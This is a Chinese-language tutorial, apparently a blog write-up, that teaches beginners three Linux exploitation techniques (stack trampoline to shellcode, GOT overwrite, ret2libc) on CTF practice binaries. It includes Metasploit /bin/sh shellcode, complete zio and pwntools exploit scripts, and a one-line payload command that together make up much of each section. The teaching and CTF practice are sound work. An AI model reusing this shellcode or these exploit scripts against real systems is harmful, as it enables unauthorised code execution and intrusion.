# linux常见漏洞利用技术实践

0x01 前言
=======

* * *

**_1.1 目的_**

1.1.1 写这篇文章一是总结一下前段时间所学的东西,二是给pwn还没入门的同学一些帮助,毕竟自己学的时候还是遇到不少困难 以下都是我的实际操作,写的比较详细,包含了我自己的一些经验,欢迎大家指点.

1.1.2 内容包含利用跳板劫持流程,GOT覆写 ,ret2libc等技术

**_1.2 预备_**

1.2.1工具

1.2.1.1 ida

反汇编神器,下载地址down.52pojie.cn

1.2.1.2 gdb

动态调试工具,ubuntu自带,但是自带高版本无法装peda插件.google 搜索downgrade gdb,重新安装低版本gdb即可

1.2.1.3 pwntools和zio

两者均是用python开发的exp编写工具,同时方便了远程exp和本地exp的转换`sudo pip install pwntool / sudo pip install zio`即可安装

1.2.1.4 peda

gdb的一个插件,github上可以下载,增加了很多方便的功能

1.2.2 预备知识

1.2.2.1 强烈的兴趣

1.2.2.2 知道简单的c代码怎样和汇编对应

[附件下载](http://drops.wooyun.org/wp-content/uploads/2015/06/%E7%A8%8B%E5%BA%8F.zip)

0x02 常见漏洞利用技术
=============

* * *

**_2.1 利用跳板覆盖返回地址_**

2.1.1 使用范围

当系统打开ASLR(基本都打开了)时,使用硬编码地址的话,就无法成功利用漏洞.在这种情况下就可以使用这种技术.程序必须关闭NX

2.1.2 原理

当函数执行完,弹出了返回地址,rsp往往指向(返回地址+8),我们将shellcode放在此处就可以让程序执行,注意跳板不一定是rsp

2.1.3 实践

在这儿用的程序是来自重庆邮电大学举办的cctf2015中pwn的第一题,感谢tracy_子鹏学长(程序见附件),运行环境64位linux

1 拿到程序第一件事就是先运行一下,熟悉要分析的东西(这一点不光是pwn,不管是re还是渗透,先对于目标有个直观了解都是很重要的事)

![enter image description here](http://drops.javaweb.org/uploads/images/b5b432824aa6563d4c27131e542ce706f3d76199.jpg)

程序很简单,就是一个简单的接受输入

2 打开ida,,可以看到程序非常的简单

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx@1
  char v5; // [sp+0h] [bp-1020h]@1
  char v6; // [sp+1000h] [bp-20h]@1
  int v7; // [sp+101Ch] [bp-4h]@1

  setbuf(stdin, 0LL, envp);
  setbuf(stdout, 0LL, v3);
  puts(0x4938E4LL);
  v7 = read(0LL, &v5, 4096LL);
  return memcpy(&v6, &v5, v7);
}

```

我们输入的数据最终会复制到[bp-20h],而且没有长度限制,肯定就是有栈溢出漏洞

3 接下来我们检查一下程序打开了哪些保护措施

![enter image description here](http://drops.javaweb.org/uploads/images/93ca2b59f5b3ffee030e11c1da6d198f83e2e4a9.jpg)

```
gdb pwn1
checksec

```

可以看到程序没有没有打开任何保护措施,现在唯一需要解决的就是系统自带的ASLR,(注意,使用gdb调试时,每次看到的栈地址可能是不变的,这并不代表系统没有打开ASLR,gdb调试时会自动关闭ASLR)

4 接下来是定位返回地址

前面看到了我们输入的数据最终会复制到[bp-20h],我们先尝试输入40个数据,用python生成40个数据

![enter image description here](http://drops.javaweb.org/uploads/images/b6c0f41c540b1e41da8919c3dcf5a6e46bf3fdcc.jpg)

```
gdb pwn1
r           //运行程序

```

复制生成的输入进去

![enter image description here](http://drops.javaweb.org/uploads/images/b47b0b611cdb054c94dfaa957be3968ac0841bbc.jpg)

看到栈上没有成功覆盖发挥地址

![enter image description here](http://drops.javaweb.org/uploads/images/b1dcf4f750801d0ca12b673dc08ef5bb6d2604d5.jpg)

再次使用八十字节

![enter image description here](http://drops.javaweb.org/uploads/images/84abdf8a81bead25c083fd4c31c0ebb3f3d234a6.jpg)

可以看出从第四十个字节开始的八个字节就会覆盖返回地址

5 写exp

首先我们需要一个shellcode,这可以通过msf生成 生成命令如下

```
show payload   
use linux/x64/exec
set cmd /bin/sh
generate -t py -b "/x00"

```

即可得到shellcode

```
# linux/x64/exec - 87 bytes
# http://www.metasploit.com
# Encoder: x64/xor
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd"
buf += "\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d"
buf += "\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53"
buf += "\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95"
buf += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"

```

然后我们还需要一个跳板作为返回地址 peda就有这种功能

```
jmpcall rsp

```

![enter image description here](http://drops.javaweb.org/uploads/images/e867211b329db5e53e284f17d4312df68aecfc78.jpg)

我们就采用第一个地址, 注意64位系统,和little endian

然后我们使用zio写exp

```
from zio import *

io = zio('./pwn1')
# io = zio(('127.0.0.1', 1234))

io.read_until('overflow!')

pad = 'a' * 40

# 0x 43 68 7d : call rsp
jmpAddr = '\x7d\x68\x43\x00\x00\x00\x00\x00'

shellcode =  ""
shellcode += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
shellcode += "\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd"
shellcode += "\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode += "\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d"
shellcode += "\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53"
shellcode += "\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95"
shellcode += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"

io.write(pad + jmpAddr + shellcode)

io.interact()

```

`python pwn1.py`运行即可看到

已拿到shell

![enter image description here](http://drops.javaweb.org/uploads/images/5ef3f9661008e9370fc3f85bc81ade01503585b2.jpg)

**_2.2 GOT覆写_**

2.2.1 使用范围

刚才我们是通过栈溢出漏洞攻击函数的返回地址,但是现在对于栈溢出,已经有很多保护,例如canary(与windows下的GS技术类似).同时现在更常见的是指针覆盖漏洞,在这种情况下我们拥有一次修改任意内存的机会,在这时我们采用的往往就是GOT覆写技术.

2.2.2 原理

GOT是全局偏移表,类似于windows中PE结构的IAT,只不过windows中IAT中的函数地址是写保护的,没办法利用,但是GOT是可写的,我们可以将其中的函数地址覆盖为我们的shellcode地址,在程序后面调用这个函数时就会调用我们的shellcode了

2.2.3 实践

在这儿我用的实验程序来自panable.kr中的passcode,比较简单,源码如下

```
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
        scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
        exit(0);
        }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;   
}

```

编译后的程序见附件,32位 linux

感觉锐锐_z的指点

1 分析程序可知,scanf时,没有用取地址符,会使用栈上的数据作为指针存放输入的数据,而我们第一次输入的数据就是在栈上,简单调试可知,在welcome()函数中的name的最后4字节会在login()函数中被用作地址指针

2 这样,我们就获得了修改任意地址数据的一次机会

3 分析程序可知如果我们用后面调用system()的地址覆盖了printf()在GOT中的指针,那么在第二次login()中第二次调用printf()时就会直接去调用system()

4 现在我们需要知道两个东西,一是GOT中printf()的地址,二是程序中调用system()的地址

```
objdump -R passcode

```

![enter image description here](http://drops.javaweb.org/uploads/images/6eb1f4e305b72044e673139cd4c8fa44af96b70f.jpg)

即可获得`printf()`在的地址`0804a000`这是攻击目标,

然后打开gdb,运行到调用system()的地方,为什么我们可以直接使用这个地址呢,因为linux下面的程序默认没有随机化code段,

![enter image description here](http://drops.javaweb.org/uploads/images/83f34ac92568a25f2a597ab1cc28f5798108d06d.jpg)

要写入的值即为`0x080485e3`

5 最后得到

```
python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode

```

`134514147`即为`0x080485e3`

![enter image description here](http://drops.javaweb.org/uploads/images/88e3987845a1268ae45e9a3d882c271eef7bd667.jpg)

成功改变了程序流程,读出flag文件的内容,注意这里需要你新建一个名叫flag的文件

**_2.3 ret2libc技术_**

2.3.1 使用范围

当系统打开DEP时,我们不能自己直接在栈上放shellcode,就使用几乎每个linux系统都会自带的libc中的代码.

2.3.2 原理

一种常见的利用方式是用libc中的system()的地址覆盖返回地址,同时在栈上布置好的参数,程序返回时就会产生一个shell

2.3.3 实践

在这儿用的程序是强网杯的urldecoder(程序见附件),再次感谢tracy_子鹏学长指点

这道题同时开了ASLR和DEP.,运行环境为32位linux

1.  分析程序后发现,前面读入数据时,只有遇到换行和EOF才会结束,但是后面检查字符串长度是用的strlen,于是可以通过在字符串中加入\x00来绕过长度检查
2.  继续分析程序流程,发现,当输入为%1\x00时就可以成功覆盖返回地址
3.  接下来就考虑利用漏洞的方法
4.  观察到溢出后,程序会多输出一些栈上的数据出来,想到可以利用输出出来的一些数据定位libc加载的基址,然后将返回地址覆盖为前面读入数据的代码地址,再读一次数据,再溢出一次,这一次执行到返回时,就执行libc中的system函数
5.  题目提供了libc,可以计算其中各函数的偏移,找到libc中system函数和/bin/sh字符串的地址,同时在栈上布置好参数,即可成功利用

下面附上exp及解释

```
from pwn import *
from zio import *

context(arch = 'i386', os = 'linux')

#注意此处ELF()的用处是后面计算偏移,你运行程序时还是用的当前系统的libc
#libc = ELF('./libc.so.6.i386')
libc = ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')

#p = remote('119.254.101.197', 10001)
p = process('./urldecoder')

#第一次输入,获取libc中的地址信息
ret_addr = '\x90\x85\x04\x08'
payload = "http://baidu.com//%1" + "\x00" + "a"*137 + ret_addr

p.recvuntil("URL:")
p.send(payload + '\n')

data = p.recvuntil("URL:")
base_addr = data[196:200]

printf_addr = l32(base_addr) - 0x117474

offset = libc.symbols['printf'] - libc.symbols['system']
system_addr = printf_addr - offset

binsh_offset = next(libc.search('/bin/sh')) - libc.symbols['printf']
binsh_addr = binsh_offset + printf_addr

#第二次输入
ret_addr = '\x12\x12\x12\x12'
payload = "http://baidu.com//%1" + "\x00" +  "a"*137 + l32(system_addr) + ret_addr +  l32(binsh_addr)

p.send(payload + '\n')
p.interactive()

```

run

```
python url.py

```

成功利用

![enter image description here](http://drops.javaweb.org/uploads/images/44e7ecb98eb1c7d3f68a78d25f6cc5fdabaf6a46.jpg)

从中也可以看到,对于同时开了ASLR和DEP的程序,利用的难度确实高了不少